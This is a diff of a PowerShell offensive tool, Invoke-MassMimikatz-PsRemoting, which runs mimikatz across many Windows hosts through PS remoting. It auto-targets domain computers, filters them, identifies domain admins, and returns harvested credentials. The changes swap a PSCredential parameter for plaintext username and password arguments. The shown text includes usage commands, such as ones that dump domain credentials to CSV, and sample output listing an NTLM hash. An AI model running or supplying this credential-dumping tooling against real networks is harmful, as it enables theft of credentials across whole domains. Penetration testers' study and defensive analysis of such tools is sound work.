@@ -4,26 +4,27 @@ Script mod author
     Scott Sutherland (@_nullbind), 2015 NetSPI
 
 Description
-    This script can be used to run mimikatz on multiple servers from both domain and non-domain systems using psremoting.
-    Features/credits:
-   	 - Idea: rob, will, and carlos
-	 - Input: Accepts host from pipeline (will's code)
-	 - Input: Accepts host list from file (will's code)
-	 - AutoTarget option will lookup domain computers from DC (carlos's code)
-	 - Ability to filter by OS (scott's code)
-	 - Ability to only target domain systems with WinRm installed (via SPNs) (scott's code)
-	 - Ability to limit number of hosts to run Mimikatz on (scott's code)
-     	 - enterprise and domain admin lookup (scotts code)
-	 - More descriptive verbose error messages (scott's code)
-	 - Ability to specify alternative credentials and query dc from non-domain system (carlos's code)
-	 - Run mimikatz on target system (chris's, Joseph's, Matt's, and benjamin's code)
-	 - Parses mimikatz output (will's code)
-	 - Returns enumerated credentials in a data table which can be used in the pipeline (scott's code)
+    This script can be used to run mimikatz on multiple servers from both domain and non-domain systems using psremoting.  
+    It supports auto-targeting of domain systems, filtering systems by os/winrm, and limiting the number of systems to 
+    run mimikatz on.  Finally, it returns the list of credentials to the pipeline so they can be used by other cmdlets. 
 	 
 Notes
     This is based on work done by rob fuller, Joseph Bialek, carlos perez, benjamin delpy, Matt Graeber, Chris campbell, and will schroeder.
-    Returns data table object to pipeline with creds.
-    Weee PowerShell.
+    Returns data table object to pipeline with creds. Weee PowerShell.
+    
+    Features/credits:
+	 - Input: Accepts host from pipeline (will's code)
+	 - Input: Accepts host list from file (will's code)
+	 - AutoTarget option will lookup domain computers from DC (carlos/scott code)
+	 - Ability to filter by OS (scott's code)
+	 - Ability to only target domain systems with WinRm installed (via SPNs) (scott's code)
+	 - Ability to limit number of hosts to run Mimikatz on (scott's code)
+     - enterprise and domain admin lookup (scotts code)
+	 - More descriptive verbose error messages (scott's code)
+	 - Ability to specify alternative credentials and query dc from non-domain system (carlos/will's code)
+	 - Run mimikatz on target system (chris's, Joseph's, Matt's, and benjamin's code)
+	 - Parse mimikatz output (will's code)
+	 - Returns enumerated credentials in a data table which can be used in the pipeline (scott's code)
 
 Command Examples
 
@@ -40,20 +41,20 @@ Command Examples
     Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt –Hosts “10.2.3.9”
 
      # Run command from non-domain system using alternative credentials. Target 10.1.1.1.
-    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose –Credential domain\user
+    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!'
 
     # Run command from non-domain system using alternative credentials.  Target 10.1.1.1, authenticate to the dc at 10.2.2.1 to determine if user is a da, and only pull passwords from one system.
-    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose  –Credential domain\user –DomainController 10.2.2.1 –AutoTarget -MaxHosts 1
+    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' –DomainController 10.2.2.1 –AutoTarget -MaxHosts 1 
 
     # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
-    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user
+    Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' –DomainController 10.2.2.1 –AutoTarget –MaxHost 5 
 
     # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Then output output to csv.
-    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user | Export-Csv c:\temp\domain-creds.csv  -NoTypeInformation 
+    Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' –DomainController 10.2.2.1 –AutoTarget –MaxHost 5  | Export-Csv c:\temp\domain-creds.csv  -NoTypeInformation 
 
 Output Sample 1
 
-    PS C:\> "10.1.1.1" | Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user | ft -AutoSize
+    PS C:\> “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' | ft -AutoSize
     VERBOSE: Getting list of Servers from provided hosts...
     VERBOSE: Found 1 servers that met search criteria.
     VERBOSE: Attempting to create 1 ps sessions...
@@ -75,7 +76,7 @@ Output Sample 1
 
 Output Sample 2
 
-PS C:\> "10.1.1.1" |Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user -DomainController 10.1.1.2 -AutoTarget | ft -AutoSize
+PS C:\> “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' -DomainController 10.1.1.2 -AutoTarget | ft -AutoSize
     VERBOSE: Getting list of Servers from provided hosts...
     VERBOSE: Getting list of Servers from DC...
     VERBOSE: Found 3 servers that met search criteria.
@@ -100,21 +101,26 @@ PS C:\> "10.1.1.1" |Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\u
     ntlm hash test        myadmin       68ed2cc11cd1b1bd0f29c7f6afe95c92 No              No                  
 
 References
-    	https://github.com/gentilkiwi/mimikatz
+    https://github.com/gentilkiwi/mimikatz
 	https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
 	https://github.com/mubix/post-exploitation/tree/master/scripts/mass_mimikatz
 	https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
 	http://blogs.technet.com/b/heyscriptingguy/archive/2009/10/29/hey-scripting-guy-october-29-2009.aspx
+    https://technet.microsoft.com/en-us/library/hh849694.aspx
 #>
 function Invoke-MassMimikatz-PsRemoting
 {
     [CmdletBinding()]
     Param(
+
         [Parameter(Mandatory=$false,
-        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
-        [System.Management.Automation.PSCredential]
-        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+        HelpMessage="Domain user to authenticate with domain\user.")]
+        [string]$username,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Domain user to authenticate with domain\user.")]
+        [string]$password,
+
         [Parameter(Mandatory=$false,
         HelpMessage="Domain controller for Domain and Site that you want to query against.")]
         [string]$DomainController,
@@ -167,6 +173,14 @@ function Invoke-MassMimikatz-PsRemoting
         # Setup initial authentication, adsi, and functions
         Begin
         {
+
+            # create ps credential
+            if($Password){
+                $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
+                $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
+            }
+
+            # Connection to ldap
             if ($DomainController -and $Credential.GetNetworkCredential().Password)
             {
                 $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
